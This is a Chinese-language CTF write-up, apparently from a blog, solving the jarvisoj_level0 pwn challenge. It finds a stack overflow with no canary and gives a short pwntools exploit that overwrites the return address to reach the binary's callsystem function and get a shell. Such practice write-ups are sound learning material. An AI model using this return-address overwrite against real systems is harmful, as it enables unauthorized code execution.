---
title: pwn练习题-jarvisoj_level0
date: 2026-11-02 16:39:50
updated: 2026-11-06 01:56:11
description: jarvisoj_level0 的 pwn 解题记录：128 字节的栈空间读入最多 512 字节，没有 canary，溢出覆盖返回地址，直接跳到程序里现成的 callsystem 函数拿到 shell。
categories: CTF
tags:
  - pwn
  - stack-overflow
  - ret2text
  - ret2win
  - pwntools
series: PWN · 栈溢出
order: 3
---

简单题：

![alt text](/images/posts/jarvisoj_level0/image.png)

看一下main函数

![alt text](/images/posts/jarvisoj_level0/image-1.png)

```c
write(fd: 1, buf: "Hello, World\n", n: 0xDu);
```

关于这个fd：跟的数字，这里做一个总结

| fd | 名称 | 作用 |
| --- | --- | --- |
| 0 | stdin | 标准输入，通常是键盘 |
| 1 | stdout | 标准输出，通常是终端 |
| 2 | stderr | 标准错误，通常也输出到终端 |

Hello, World\n已经有13个字节了

这里对比一下这个read和write，这两个容易搞混

举例分析：

- `read(0, buf, 0x20)`：从标准输入读取最多 32 字节，放入 buf。
- `write(1, buf, 0x20)`：从 buf 读取 32 字节，写入标准输出。

这个不是解题的关键，关键是vulnerable_function(a1: v3)

![alt text](/images/posts/jarvisoj_level0/image-2.png)

只有128的栈空间要塞入512，结合前面没有金丝雀，妥妥的栈溢出，结合看到的callsystem，反汇编找一下这个函数的地址，搞定

![alt text](/images/posts/jarvisoj_level0/image-3.png)

写exploit：

```python
from pwn import *

p = remote("bfbb756589fd1e9084775772.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="bfbb756589fd1e9084775772.tcp-ctf2.dasctf.com")

payload = b'A' * 136 + p64(0x400596)

p.sendline(payload)

p.interactive()
```

结果

![alt text](/images/posts/jarvisoj_level0/image-4.png)
